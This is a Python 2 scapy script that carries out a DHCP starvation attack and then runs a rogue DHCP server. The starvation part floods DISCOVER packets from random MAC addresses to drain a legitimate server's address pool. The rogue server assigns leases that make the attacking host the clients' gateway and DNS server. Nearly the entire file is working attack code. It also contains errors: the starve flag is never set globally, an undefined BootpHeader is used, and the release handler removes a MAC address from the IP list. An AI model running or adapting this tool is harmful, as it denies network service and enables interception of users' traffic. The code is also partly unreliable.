#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys, argparse, os, signal, time
import threading
from scapy.all import *
import re

conf.checkIPaddr = False
interface = "lo"
start_ip = "192.168.1.100"
end_ip = "192.168.1.200"
netmask = "255.255.255.0"
starve = False

threadPool = []

def checkArgs():
	global interface, start_ip, end_ip, netmask

	parser = argparse.ArgumentParser()
	parser.add_argument("interface", help="interface to sniff")
	parser.add_argument("start", help="DHCP start IP")
	parser.add_argument("end", help="DHCP end IP")
	parser.add_argument("netmask", help="DHCP netmask")
	parser.add_argument("-s", "--starve", action="store_true", help="Sends DISCOVER packets to deplete existing DHCP server's pool")

	args = parser.parse_args()
	interface = args.interface
	start_ip = args.start
	end_ip = args.end
	netmask = args.netmask

	if args.starve != None:
		starve = args.starve

	if atol(start_ip) > atol(end_ip):
		print "err: start ip is larger than end ip"
		sys.exit(2)

class dhcp_starve(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
		self.kill = False

	def run(self):
		global conf
		conf.checkIPaddr = False

		dhcp_discover = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")
		dhcp_discover /= IP(src="0.0.0.0",dst="255.255.255.255")
		dhcp_discover /= UDP(sport=68, dport=67)
		dhcp_discover /= BOOTP(chaddr=RandString(12,'0123456789abcdef'))
		dhcp_discover /= DHCP(options=[("message-type","discover"),"end"])

		while not self.kill:
			sendp(dhcp_discover, iface=interface)


class dhcp_server(threading.Thread):
	def __init__(self, **kargs):
		threading.Thread.__init__(self)
		self.filter="udp and src port 68 and dst port 67"

		self.kill = False
		self.parser_args(**kargs) # parse keyword arguments
		self.pool_init() # Initialise IP Pool

		# DHCP information
		self.myIP = get_if_addr(interface)
		self.myMAC = get_if_hwaddr(interface)
		self.polllist=[] # Used IP pool
		self.macip_dict={} # Record for previous users
		self.lease_time=3600
		self.renewal_time=self.lease_time/2
		self.rebinding_time = self.lease_time*7/8
		self.offer_timeout=0
		self.ack_timeout=0
		self.default_ttl=mac2str('40')
		self.T1=0
		self.T2=0
		self.broadcast = ltoa(atol(self.myIP) | (0xffffffff & ~atol(self.netmask)))
		self.daemon = True
		self.run()

	def parser_args(self,**kargs):
		"""Sets keyword arguments into attributes"""
		for key, value in kargs.items():
			print "setting attribute",key, ":",value
			setattr(self, key, value)

	def pool_init(self):
		"""Initialises the start and end IP"""
		self.startIp=self.ip2int(self.start_sip)
		self.endIp=self.ip2int(self.start_eip)

	def poolfree(self, mac):
		"""
		Retrieves an IP from pool of IP,
		if no IP is available, return 0.0.0.0
		"""
		if mac in self.macip_dict.keys():
			return self.macip_dict[mac]
		else:
			for i in range(self.startIp, self.endIp+1):
				current_ip = self.num2ip(i)
				if current_ip not in self.polllist:
					return current_ip
		return "0.0.0.0"

	def run(self):
		"""Main thread function"""
		print "running DHCP server on", self.myMAC, ":", self.myIP
		print "sniffing..."
		sniff(filter=self.filter, prn=self.detect_parserDhcp, store=0, iface=self.iface)

	def detect_parserDhcp(self, pkt):
		"""
		receives pkt and checks if it is a DHCP packet.

		Message Types:
		1->Discover
		2->OFFER
		3->Request
		4->Decline
		5->ACK
		6->NAK
		7->Release
		8->Inform
		"""
		if DHCP in pkt:
			# Set up base packet
			if pkt[IP].src == "0.0.0.0":
				raw=Ether()/IP()/UDP(sport=67,dport=68)/BOOTP()/DHCP()
				raw[Ether].src, raw[IP].src = self.myMAC, self.myIP
				raw[Ether].dst, raw[IP].dst = pkt[Ether].src, "255.255.255.255"
				raw[BOOTP]= BOOTP(op = 2, # reply
								  xid = pkt[BOOTP].xid,
								  chaddr= self.mac2bin(pkt[Ether].src),
								  yiaddr="0.0.0.0")/DHCP()

			# Packet came from relay agent
			else:
				raw=Ether()/IP()/UDP(sport=67,dport=68)/BOOTP()/DHCP()
				raw[Ether].src, raw[IP].src = self.myMAC, self.myIP
				raw[Ether].dst, raw[IP].dst = pkt[Ether].src, pkt[IP].src
				raw[BOOTP]= BOOTP(op = 2, # reply
								  xid = pkt[BOOTP].xid,
								  chaddr= self.mac2bin(pkt[Ether].src),
								  yiaddr="0.0.0.0",
								  giaddr=pkt[IP].src)/DHCP()
			DhcpOption=[
				#('client_id', chr(1), self.mac2bin(pkt[Ether].src))
				('server_id', self.myIP),
				('lease_time',self.lease_time),
				('renewal_time', self.renewal_time),
				('rebinding_time', self.rebinding_time),
				('subnet_mask', self.netmask),
				('router', self.myIP),
				('name_server', self.myIP),
				('broadcast_address', self.broadcast),
				('default_ttl',self.default_ttl)
			]

			Mtype = pkt[DHCP].options[0][1]
			print "DHCP option", Mtype
			if Mtype == 1 or Mtype == 3:
				dhcpsip = pkt[IP].src
				dhcpsmac = pkt[Ether].src
				cli_mac = pkt[Ether].src
				localxid = pkt[BOOTP].xid
				your_ip = self.poolfree(dhcpsmac)
				raw[BOOTP].yiaddr = your_ip

				if your_ip == "0.0.0.0":
					# No more available IP, send NAK
					BootpHeader.yiaddr = your_ip # consider changing
					nak = (Ether(src=self.myMAC, dst="ff:ff:ff:ff:ff:ff")/
						  IP(src=self.myIP, dst="255.255.255.255")/
						  UDP(sport=67,dport=68)/
						  BootpHeader/
						  DHCP(options=[("message-type","nak"),("server_id",self.myIP),"end"]))
					sendp(nak ,verbose=0, iface=self.iface)

				else:
					if Mtype == 1:
						# Respond to DISCOVER Packets
						print "Received DISCOVER from",pkt[Ether].src

						DhcpOption.insert(0, ("message-type","offer"))
						DhcpOption.append("end")
						DhcpOption.append(mac2str("00")*20)
						raw[DHCP]=DHCP(options=DhcpOption)

						print "raw.summary=", raw.summary

						if self.waittimeout(self.offer_timeout):
							sendp(raw, iface=self.iface)

					elif Mtype == 3:
						# Respond to REQUEST Packets
						DhcpOption.insert(0,("message-type","ack"))
						DhcpOption.append("end")
						DhcpOption.append(mac2str("00")*20)
						raw[DHCP]=DHCP(options=DhcpOption)

						if pkt[BOOTP].ciaddr == "0.0.0.0":
							# New client
							if self.waittimeout(self.ack_timeout):
								sendp(raw, verbose=0, iface=self.iface)
								self.macip_dict[dhcpsmac]= your_ip
								self.polllist.append(your_ip)
						else:
							if pkt[IP].src == "0.0.0.0":
								if self.waittimeout(self.T2):
									sendp(raw,verbose=0,iface=self.iface)
									self.macip_dict[dhcpsmac]=your_ip
									self.polllist.append(your_ip)
							else:
								if self.waittimeout(self.T1):
									sendp(raw,iface=self.iface)
									self.macip_dict[dhcpsmac]=your_ip
									self.polllist.append(your_ip)
			elif Mtype == 4:
				# Declined IP due to duplicate IP
				options=pkt[DHCP].options
				optionlen=len(options)
				for i in range(optionlen):
					if options[i][0] == "requested_addr":
						self.polllist.append(options[i][1])
						break

			elif Mtype == 7:
				# Release IP
				dhcpsip = pkt[IP].src
				dhcpsmac = pkt[Ether].src
				self.polllist.remove(dhcpsmac)

	def waittimeout(self, num):
		num=int(num)
		if num>=0:
			time.sleep(num)
			return True
		else:
			return False

	def mac2bin(self,mac,flag=":-"):
		hexlist=re.split(r"[%s]" %(flag),mac)
		hexstr="".join(hexlist)
		binmac=self.hex2bin(hexstr)
		return binmac

	def hex2bin(self,hexstr):
		len_str=len(hexstr)
		substr=""
		for i in range(0,len_str,2):
			substr=substr+chr(int(hexstr[i:i+2],16))
		return substr

	def ip2int(self,ip):
		return reduce(lambda a,b: a<<8 | b, map(int, ip.split(".")))

	def num2ip(self,ip_num):
		return ".".join(map(lambda n: str(ip_num>>n & 0xFF), [24,16,8,0]))


if __name__ == "__main__":
	checkArgs()

	kargs = {
		"iface": interface,
		"netmask": netmask,
		"start_sip": start_ip,
		"start_eip": end_ip,
	}

	try:
		if starve:
			print "Starting DHCP starvation"
			t=dhcp_starve()
			t.start()
			time.sleep(10)
			t.kill = True
			print "Stopping DHCP starvation"

		t = dhcp_server(**kargs)
		t.start()
		threadPool.append(t)
		
	except KeyboardInterrupt:
		for t in threadPool:
			t.join()

		sys.exit(0)
